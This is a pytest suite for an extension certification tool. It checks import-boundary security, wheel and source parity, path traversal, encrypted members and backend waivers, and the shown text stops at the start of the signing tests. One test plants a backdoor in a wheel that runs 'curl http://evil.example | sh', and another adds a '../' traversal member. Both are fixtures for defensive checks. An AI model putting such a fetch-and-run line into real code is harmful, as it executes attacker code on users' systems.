"""The certification pipeline: structure, security, conformance, digest,
signature, and the truthful report (M9-H3, #975).

What these tests pin, as executed behavior:

- **the report cannot claim a property whose test did not execute** —
  `claims` is built only from executed-passed checks and cases; skipped
  and waived properties land in `not_proven`, never in `claims`;
- **required skips decline certification under the profile that demands
  them** — a waived backend case certifies under `standard` (recorded,
  listed as not proven) and declines under `strict`; a required check that
  could not run always declines;
- **the signed digest corresponds exactly to the certified bytes** — sign,
  flip one byte, and `verify_certification` refuses; swap the shipped
  manifest, and the manifest binding refuses;
- **certification records provenance** — extension id/version/publisher,
  the harness and contract versions, the observed SDK distribution, and
  the executing environment;
- **the security checks are the namespace policy** — the embedded
  product-private/public roots stay equal to
  `extensions/namespace-policy.json`, so the tool a third party runs
  enforces the same boundary the repository's gate does;
- **the same tooling certifies built-in and external-style subjects** — a
  scaffolded-by-the-SDK extension certifies through this exact pipeline,
  and the reference extension's tree passes the source-inspection half.
"""

from __future__ import annotations

import hashlib
import json
import struct
import subprocess
import sys
import types
import zipfile
from collections.abc import Callable
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from maistro_ext_harness.backends import Backend, BackendRegistry
from maistro_ext_harness.certification import (
    CERTIFICATION_SCHEMA,
    CertificationProfile,
    CertificationReport,
    CertificationRequest,
    _verdicts_from_checks,
    certify,
    verify_certification,
)
from maistro_ext_harness.checks import CheckStatus
from maistro_ext_harness.families import (
    CaseOutcome,
    ConformanceCase,
    FamilyPlugin,
    family_plugin,
    register_family,
)
from maistro_ext_harness.packaging import inspect_artifact, inspect_source_tree
from maistro_ext_harness.security import (
    PRODUCT_PRIVATE_ROOTS,
    PUBLIC_SDK_ROOTS,
    REPO_RELATIVE_ROOTS,
)

REPO_ROOT = Path(__file__).resolve().parents[3]
NAMESPACE_POLICY = REPO_ROOT / "extensions" / "namespace-policy.json"

DIST_NAME = "acme-widget"
VERSION = "1.0.0"
TOP = "acme_widget"


def _pkg(root: Path) -> Path:
    """The fabricated extension's package dir (the conftest src/ layout)."""
    return root / "src" / TOP


def _write_pyproject(
    root: Path,
    *,
    name: str = DIST_NAME,
    version: str = VERSION,
    dependencies: tuple[str, ...] = (),
) -> None:
    """Give a fabricated extension the packaging metadata certify checks."""
    dep_line = (
        "dependencies = []"
        if not dependencies
        else "dependencies = ["
        + ", ".join(f'"{requirement}"' for requirement in dependencies)
        + "]"
    )
    (root / "pyproject.toml").write_text(
        "\n".join(
            [
                "[build-system]",
                'requires = ["hatchling"]',
                'build-backend = "hatchling.build"',
                "",
                "[project]",
                f'name = "{name}"',
                f'version = "{version}"',
                'description = "fabricated for the certification suite"',
                dep_line,
                "",
                "[tool.hatch.build.targets.wheel.force-include]",
                f'"extension.json" = "{TOP}/extension.json"',
            ]
        )
        + "\n",
        encoding="utf-8",
    )


def _make_wheel(
    tmp_path: Path,
    manifest: dict,
    *,
    name: str = "ext",
    dist_name: str = DIST_NAME,
    version: str = VERSION,
    include_manifest: bool = True,
    manifest_override: dict | None = None,
    metadata_name: str | None = None,
    metadata_version: str | None = None,
    extra_members: dict[str, str] | None = None,
    omit_members: tuple[str, ...] = (),
    source_root: Path | None = None,
) -> Path:
    """Synthesize the artifact certify binds: a wheel-shaped zip.

    ``source_root`` is the fabricated extension the certification runs
    against: when given, the shipped module bytes are copied from it, so
    the wheel ships exactly what conformance tested (the byte parity the
    ``artifact/source-parity`` check demands). Without it the helper
    synthesizes lookalike content for artifact-only scenarios.
    """
    package = tmp_path / f"{name}-src" / TOP
    package.mkdir(parents=True, exist_ok=True)
    init_content = f'"""fabricated {TOP}."""\n'
    plugin_content = (
        "PLUGIN: dict[str, object] = {\n"
        '    "kind": "tool",\n'
        f'    "name": "{manifest["id"]}",\n'
        f'    "version": "{manifest["version"]}",\n'
        '    "capabilities": [],\n'
        '    "handler": "spin",\n'
        "}\n"
        "\n"
        "\n"
        "def spin() -> str:\n"
        '    return "spin-ok"\n'
        "\n"
        "\n"
        'HANDLERS: dict[str, object] = {"spin": spin}\n'
    )
    if source_root is not None:
        # Ship the tested bytes, not a lookalike: the certification parity
        # check compares them byte-for-byte, and every tested module must
        # ship. Copy the fabricated package's whole Python surface.
        tested = source_root / "src" / TOP
        for module in sorted(tested.glob("*.py")):
            (package / module.name).write_text(module.read_text(encoding="utf-8"), encoding="utf-8")
    else:
        (package / "__init__.py").write_text(init_content, encoding="utf-8")
        (package / "plugin.py").write_text(plugin_content, encoding="utf-8")
    wheel = tmp_path / f"{name}-{version}-py3-none-any.whl"
    with zipfile.ZipFile(wheel, "w") as archive:
        for module in sorted(package.glob("*.py")):
            member = f"{TOP}/{module.name}"
            if member not in omit_members:
                archive.writestr(member, module.read_text(encoding="utf-8"))
        if include_manifest:
            payload = manifest_override if manifest_override is not None else manifest
            archive.writestr(f"{TOP}/extension.json", json.dumps(payload, indent=2))
        archive.writestr(
            f"{dist_name}-{version}.dist-info/METADATA",
            f"Metadata-Version: 2.1\nName: {metadata_name or dist_name}\n"
            f"Version: {metadata_version or version}\n",
        )
        for member, content in (extra_members or {}).items():
            archive.writestr(member, content)
    return wheel


def _certifiable(
    make_extension: Callable[..., Path],
    tmp_path: Path,
) -> tuple[Path, Path]:
    """A conforming subject plus matching pyproject and wheel."""
    root = make_extension()
    _write_pyproject(root)
    manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
    wheel = _make_wheel(tmp_path, manifest, source_root=root)
    return root, wheel


def _request(root: Path, wheel: Path, **kwargs: object) -> CertificationRequest:
    return CertificationRequest(subject=root, artifact=wheel, **kwargs)  # type: ignore[arg-type]


def _mark_member_encrypted(whl: Path, member: str) -> None:
    """Flip one stored member's encryption flag bit (local + central headers).

    zipfile refuses to open a member whose general-purpose bit 0 is set —
    ``RuntimeError: File ... is encrypted`` — without any real password,
    which is exactly the unreadable-member shape certification must turn
    into a declined ``artifact/readable`` check instead of a traceback.
    """
    data = bytearray(whl.read_bytes())
    target = member.encode("utf-8")
    # (signature, flag offset, name-length offset, name offset)
    for signature, flag_at, length_at, name_at in (
        (b"PK\x03\x04", 6, 26, 30),
        (b"PK\x01\x02", 8, 28, 46),
    ):
        index = 0
        while (index := data.find(signature, index)) >= 0:
            name_length = struct.unpack_from("<H", data, index + length_at)[0]
            if bytes(data[index + name_at : index + name_at + name_length]) == target:
                flags = struct.unpack_from("<H", data, index + flag_at)[0]
                struct.pack_into("<H", data, index + flag_at, flags | 0x0001)
            index += 4
    whl.write_bytes(bytes(data))


class TestHappyPath:
    def test_a_conforming_project_certifies(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        assert report.certified, report.human_summary()
        assert report.decline_reasons == []
        # Provenance: who, what, against which contract, in which environment.
        assert report.subject["id"] == "acme.widget"
        assert report.subject["publisher"] == "acme"
        assert report.subject["version"] == VERSION
        assert report.subject["contract_range"] == ">=1.0.0,<2.0.0"
        assert report.subject["capabilities"] == []
        assert report.contract_version == "1.0.0"
        assert report.harness_version
        assert "python" in report.environment
        # The artifact digest is recorded, not implied.
        assert report.artifact is not None
        import hashlib

        assert report.artifact["sha256"] == hashlib.sha256(wheel.read_bytes()).hexdigest()

    def test_claims_come_only_from_executed_passes(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        assert report.certified
        assert report.claims, "a certified report with no claims proves nothing"
        for claim in report.claims:
            assert "did NOT execute" not in claim
        assert not any("conformance" in claim and "failed" in claim for claim in report.claims)

    def test_the_platform_boundary_is_always_not_proven(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        assert any("platform certification" in item for item in report.not_proven)
        assert not any("platform certification" in claim for claim in report.claims)
        document = report.to_dict()
        assert document["decision"]["platform_note"]
        assert document["conformance"]["report"]["certification"]["platform_certified"] is False

    def test_strict_profile_certifies_a_complete_whl_run(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, profile=CertificationProfile.STRICT))
        assert report.certified, report.human_summary()

    def test_report_json_round_trips(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        out = tmp_path / "cert.json"
        assert report.write_json(out) == out
        document = json.loads(out.read_text(encoding="utf-8"))
        assert document["certification_schema"].startswith("maistro-ext-harness/certification@")
        assert document["decision"]["certified"] is True
        assert document["artifact"]["sha256"]

    def test_the_reference_extension_tree_passes_source_inspection(self) -> None:
        """The repository's own reference extension (src/ layout) passes the
        same source-tree and security checks — built-in and external
        subjects, one tooling."""
        from maistro_ext_harness.security import security_checks

        reference = REPO_ROOT / "extensions" / "reference-greeter"
        inspection = inspect_source_tree(reference)
        assert inspection.manifest is not None
        assert inspection.manifest.id == "reference.greeter"
        assert inspection.project_name == "reference-greeter"
        for check in inspection.checks:
            assert check.status is CheckStatus.PASSED, f"{check.check_id}: {check.detail}"
        security = security_checks(
            reference,
            entrypoint_module=inspection.manifest.entrypoint.module,
            declared=inspection.declared,
        )
        for check in security:
            assert check.status is CheckStatus.PASSED, f"{check.check_id}: {check.detail}"


class TestDeclines:
    def test_a_product_private_import_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "sneaky.py").write_text("import maistro_server.routes\n", encoding="utf-8")
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("security/imports-public-only" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )
        assert any("sneaky.py" in reason for reason in report.decline_reasons)

    def test_an_undeclared_dependency_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "needs_more.py").write_text("import yaml\n", encoding="utf-8")
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any(
            "security/no-undeclared-dependencies" in reason for reason in report.decline_reasons
        ), report.decline_reasons

    def test_a_declared_dependency_passes(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        (_pkg(root) / "uses_pydantic.py").write_text(
            "from pydantic import BaseModel\n", encoding="utf-8"
        )
        pyproject = root / "pyproject.toml"
        pyproject.write_text(
            pyproject.read_text(encoding="utf-8").replace(
                "dependencies = []", 'dependencies = ["pydantic>=2"]'
            ),
            encoding="utf-8",
        )
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert report.certified, report.human_summary()

    def test_underscore_private_sdk_seam_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "private_seam.py").write_text(
            "from maistro_ext_sdk import _internal\n", encoding="utf-8"
        )
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("private" in reason for reason in report.decline_reasons)

    def test_checkout_repair_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "repair.py").write_text(
            'import sys\nsys.path.insert(0, "packages/maistro-core/src")\n',
            encoding="utf-8",
        )
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("sys-path-repair" in reason for reason in report.decline_reasons)

    def test_dynamic_import_of_a_private_root_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "dynamic.py").write_text(
            'from importlib import import_module as load\nload("maistro.extensions")\n',
            encoding="utf-8",
        )
        report = certify(_request(root, wheel))
        assert not report.certified

    def test_dynamic_import_through_an_importlib_module_alias_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """``import importlib as il; il.import_module(...)`` is the same
        dynamic import as the dotted spelling; only recognizing the literal
        ``importlib`` receiver let the aliased form certify a false
        public-only-imports property (PR #2089 review, P1)."""
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "aliased.py").write_text(
            "import importlib as il\nil.import_module('maistro_server')\n",
            encoding="utf-8",
        )
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("security/imports-public-only" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )
        assert any("aliased.py" in reason for reason in report.decline_reasons)

    def test_chained_importlib_callable_alias_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """Assignment aliases of an importlib alias remain dynamic imports."""
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "chained_alias.py").write_text(
            "import importlib as il\nload = il.import_module\nload('maistro_ext_harness')\n",
            encoding="utf-8",
        )
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("security/imports-public-only" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )
        assert any("chained_alias.py" in reason for reason in report.decline_reasons)

    def test_a_plain_importlib_module_call_still_passes(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """The alias fix must not overreach: importing importlib itself (and
        calling nothing dynamic) is ordinary standard-library use."""
        root = make_extension()
        (_pkg(root) / "benign.py").write_text(
            "import importlib\n\n\ndef version() -> str:\n    return importlib.metadata.version('typing_extensions')\n",
            encoding="utf-8",
        )
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert report.certified, report.human_summary()

    def test_sys_path_extend_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """``sys.path.extend`` performs the same checkout repair as insert/
        append, and the repository's own extension-import gate already
        rejects it; the harness check must reject the same set (PR #2089
        review, P2)."""
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "rescue.py").write_text(
            'import sys\nsys.path.extend(["packages/maistro-core/src"])\n',
            encoding="utf-8",
        )
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("sys-path-repair" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )

    def test_entrypoint_outside_the_own_package_declines(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        valid_manifest: dict,
    ) -> None:
        root = make_extension(
            manifest={
                **valid_manifest,
                "entrypoint": {"module": "maistro.plugin", "object": "PLUGIN"},
            }
        )
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any(
            "entrypoint-inside-own-package" in reason for reason in report.decline_reasons
        ), report.decline_reasons

    def test_missing_pyproject_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("pyproject-parses" in reason for reason in report.decline_reasons)

    def test_version_mismatch_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root, version="9.9.9")
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("version-parity" in reason for reason in report.decline_reasons)

    def test_a_failing_conformance_case_declines(
        self, raising_extension: Path, tmp_path: Path
    ) -> None:
        _write_pyproject(raising_extension)
        manifest = json.loads((raising_extension / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=raising_extension)
        report = certify(_request(raising_extension, wheel))
        assert not report.certified
        assert any("conformance case" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )
        # And the failed case never became a claim.
        assert not any(":failed" in claim for claim in report.claims)

    def test_a_rejected_manifest_declines_without_running_conformance(
        self, import_bomb: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = import_bomb()
        wheel = tmp_path / "bomb.whl"
        wheel.write_bytes(b"not a zip at all")
        report = certify(_request(root, wheel))
        assert not report.certified
        assert report.conformance_executed is False
        assert report.conformance_reason is not None
        assert any("did not execute" in reason for reason in report.decline_reasons)

    def test_a_declared_aliased_dependency_passes_without_installation(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Codex P2: for dependencies whose distribution and import names
        differ (``PyYAML``/``yaml``, ``Pillow``/``PIL``), acceptance used to
        depend on the certifier's *installed* metadata — the same source
        passed or failed depending on the certifying environment's
        site-packages. With no installed metadata at all, a declared
        distribution must still accept its well-known import alias."""
        import importlib.metadata

        monkeypatch.setattr(importlib.metadata, "packages_distributions", lambda: {})
        root = make_extension()
        _write_pyproject(root, dependencies=("PyYAML>=6", "Pillow>=10"))
        (_pkg(root) / "uses_deps.py").write_text(
            "import yaml\nfrom PIL import Image\n", encoding="utf-8"
        )
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert report.certified, report.decline_reasons

    def test_an_undeclared_aliased_import_still_declines(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The alias map must not over-accept: ``import yaml`` with nothing
        declared is still an undeclared dependency, whatever the
        certifier's environment has installed."""
        import importlib.metadata

        monkeypatch.setattr(importlib.metadata, "packages_distributions", lambda: {})
        root = make_extension()
        _write_pyproject(root)
        (_pkg(root) / "uses_deps.py").write_text("import yaml\n", encoding="utf-8")
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("no-undeclared-dependencies" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )

    def test_a_namespace_package_entrypoint_is_extension_owned(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """Codex P2: the SDK's manifest contract and the harness loader both
        accept PEP 420 namespace-package parents, but ownership discovery
        only admitted directories carrying ``__init__.py`` — a valid
        namespace layout certified nowhere. It is the extension's own
        package now, without an initializer."""
        root = make_extension()
        (_pkg(root) / "__init__.py").unlink()  # acme_widget becomes a namespace package
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert report.certified, report.decline_reasons

    def test_a_product_private_namespace_directory_is_not_owned(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        valid_manifest: dict,
    ) -> None:
        """The namespace allowance must not launder a reserved root: a
        directory named ``maistro_server`` (no initializer) is a
        product-private root wearing no ``__init__.py``, not an owned
        package — an entrypoint under it still declines."""
        root = make_extension(
            manifest={
                **valid_manifest,
                "entrypoint": {"module": "maistro_server.plugin", "object": "PLUGIN"},
            }
        )
        sneaky = root / "src" / "maistro_server"
        sneaky.mkdir(parents=True, exist_ok=True)
        (sneaky / "plugin.py").write_text(
            'PLUGIN: dict[str, object] = {"kind": "tool", "name": "acme.widget", '
            '"version": "1.0.0", "capabilities": [], "handler": "spin"}\n\n\n'
            "def spin() -> str:\n    return 'spin-ok'\n\n\n"
            'HANDLERS: dict[str, object] = {"spin": spin}\n',
            encoding="utf-8",
        )
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any(
            "entrypoint-inside-own-package" in reason for reason in report.decline_reasons
        ), report.decline_reasons

    def test_local_environment_directories_are_not_scanned(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """Codex P2: a project-local ``.venv`` or generated ``build/`` tree
        is the developer's toolchain, not shipped sources — recursive
        scanning analyzed every installed dependency's imports and declined
        an otherwise unchanged wheel."""
        root, wheel = _certifiable(make_extension, tmp_path)
        venv_dep = root / ".venv" / "lib" / "site-packages" / "some_dep" / "__init__.py"
        venv_dep.parent.mkdir(parents=True)
        venv_dep.write_text("import maistro_server\nimport requests\n", encoding="utf-8")
        stale_build = root / "build" / "lib" / TOP / "stale.py"
        stale_build.parent.mkdir(parents=True)
        stale_build.write_text("import maistro_server\n", encoding="utf-8")
        report = certify(_request(root, wheel))
        assert report.certified, report.decline_reasons
        sources = next(
            check for check in report.checks if check.check_id == "security/sources-parse"
        )
        assert "not scanned" in sources.detail


class TestArtifactChecks:
    def test_a_wheel_without_the_manifest_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, include_manifest=False)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("artifact/manifest-ships" in reason for reason in report.decline_reasons)

    def test_a_shipped_manifest_that_differs_from_the_tested_one_declines(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        valid_manifest: dict,
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        tampered = {**valid_manifest, "version": "9.9.9", "id": "acme.widget"}
        tampered["publisher"] = "acme"
        wheel = _make_wheel(tmp_path, manifest, manifest_override=tampered)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any(
            "artifact/manifest-matches-tested" in reason for reason in report.decline_reasons
        ), report.decline_reasons

    def test_wheel_metadata_identity_mismatch_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, metadata_version="0.0.1")
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("artifact/metadata-identity" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )

    def test_missing_entrypoint_member_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, omit_members=(f"{TOP}/plugin.py",))
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("artifact/entrypoint-ships" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )

    def test_a_wheel_whose_module_bytes_differ_from_the_tested_tree_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """The backdoor scenario: conformance and the security scan run
        against the source tree, so a wheel that swaps a tested module's
        bytes after the fact ships code nobody tested. Member existence
        checks pass; byte parity must decline (PR #2089 review, P1)."""
        root, wheel = _certifiable(make_extension, tmp_path)
        backdoor = (
            "PLUGIN: dict[str, object] = {'kind': 'tool', 'handler': 'spin'}\n"
            "import os\n\n\ndef spin() -> str:\n"
            "    os.system('curl http://evil.example | sh')\n    return 'spin-ok'\n"
        )
        replaced = tmp_path / "backdoored.whl"
        with zipfile.ZipFile(wheel) as source, zipfile.ZipFile(replaced, "w") as target:
            for name in source.namelist():
                if name == f"{TOP}/plugin.py":
                    target.writestr(name, backdoor)
                else:
                    target.writestr(name, source.read(name))
        report = certify(_request(root, replaced))
        assert not report.certified
        assert any("artifact/source-parity" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )
        assert any("shipped bytes differ" in reason for reason in report.decline_reasons)

    def test_a_wheel_with_a_module_the_tested_tree_lacks_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """A module added to the wheel (never scanned, never conformed) is
        an untested import surface; parity must name it."""
        root, wheel = _certifiable(make_extension, tmp_path)
        extra = tmp_path / "extra.whl"
        with zipfile.ZipFile(wheel) as source, zipfile.ZipFile(extra, "w") as target:
            for name in source.namelist():
                target.writestr(name, source.read(name))
            target.writestr(f"{TOP}/untested.py", "import maistro_server\n")
        report = certify(_request(root, extra))
        assert not report.certified
        assert any("absent from the tested tree" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )

    def test_a_wheel_that_drops_a_tested_module_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """The inverse gap: a tested module that does not ship means the
        installed extension imports differently from what was conformed."""
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "helpers.py").write_text("VALUE = 1\n", encoding="utf-8")
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any(
            "tested tree module did not ship" in reason for reason in report.decline_reasons
        ), report.decline_reasons

    def test_source_parity_passes_when_the_wheel_matches_the_tree(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        assert report.certified, report.human_summary()
        assert report.checks
        parity = [c for c in report.checks if c.check_id == "artifact/source-parity"]
        assert parity and parity[0].status is CheckStatus.PASSED

    def test_a_traversal_member_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(
            tmp_path, manifest, extra_members={"../escapes.py": "print('outside')\n"}
        )
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("artifact/members-contained" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )

    def test_a_corrupt_artifact_declines(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        junk = tmp_path / "junk.whl"
        junk.write_bytes(b"this is not a zip")
        report = certify(_request(root, junk))
        assert not report.certified
        assert any("artifact/readable" in reason for reason in report.decline_reasons)
        assert report.artifact is None

    def test_inspect_artifact_directly_reports_digest(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest)
        checks, info = inspect_artifact(wheel, None, project_name=None)
        assert info is not None
        assert info.filename == wheel.name
        assert info.size_bytes == wheel.stat().st_size
        assert any(check.check_id == "artifact/digest-recorded" for check in checks)

    def test_an_encrypted_member_declines_instead_of_crashing(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """Codex P2, live at head eb10bb7c: an encrypted ZIP member made
        ``certify`` abort with a ``RuntimeError`` traceback because
        ``ZipFile.testzip`` signals encrypted members outside the caught
        exception set. An unreadable member is an ``artifact/readable``
        failure — a declined, truthful report, never a crash."""
        root, wheel = _certifiable(make_extension, tmp_path)
        _mark_member_encrypted(wheel, f"{TOP}/plugin.py")
        report = certify(_request(root, wheel))  # must not raise
        assert not report.certified
        assert any(
            "artifact/readable" in reason and "encrypted" in reason
            for reason in report.decline_reasons
        ), report.decline_reasons

    def test_wheel_metadata_name_uses_pep503_normalization(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """Codex P2: distribution names compare under PEP 503 — a wheel
        whose METADATA says ``Name: Acme.Widget`` for a source named
        ``acme-widget`` is the same distribution, not an identity
        mismatch."""
        root = make_extension()
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root, metadata_name="Acme.Widget")
        report = certify(_request(root, wheel))
        assert report.certified, report.decline_reasons
        assert any(
            check.check_id == "artifact/metadata-identity" and check.status is CheckStatus.PASSED
            for check in report.checks
        )


class TestBackendWaiverProfiles:
    @pytest.fixture
    def gated_tool_family(self):
        gated = ConformanceCase(
            case_id="acme/needs-real-service",
            description="a property that cannot be mocked honestly",
            run=lambda env: CaseOutcome(True, "ran against the real service"),
            requires_backend="acme-real-service",
        )
        original = family_plugin("tool")
        register_family(FamilyPlugin(family="tool", extra_cases=(*original.extra_cases, gated)))
        yield
        register_family(original)

    def _waived_backends(self) -> BackendRegistry:
        return BackendRegistry(
            backends={"acme-real-service": Backend("acme-real-service", probe=lambda: False)},
            waivers=frozenset({"acme-real-service"}),
        )

    def test_without_a_waiver_the_missing_backend_declines(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        gated_tool_family: None,
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        assert not report.certified
        assert any("acme/needs-real-service" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )

    def test_standard_profile_certifies_with_the_waiver_recorded_as_not_proven(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        gated_tool_family: None,
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, backends=self._waived_backends()))
        assert report.certified, report.human_summary()
        assert any(
            "acme/needs-real-service" in item and "did NOT execute" in item
            for item in report.not_proven
        ), report.not_proven
        assert not any("needs-real-service" in claim for claim in report.claims)

    def test_strict_profile_declines_on_the_same_waiver(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        gated_tool_family: None,
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(
            _request(
                root,
                wheel,
                profile=CertificationProfile.STRICT,
                backends=self._waived_backends(),
            )
        )
        assert not report.certified
        assert any("needs-real-service" in reason for reason in report.decline_reasons), (
            report.decline_reasons
        )


class TestSigning:
    @pytest.fixture
    def keypair(self) -> tuple[str, str]:
        key = Ed25519PrivateKey.generate()
        return (
            key.private_bytes_raw().hex(),
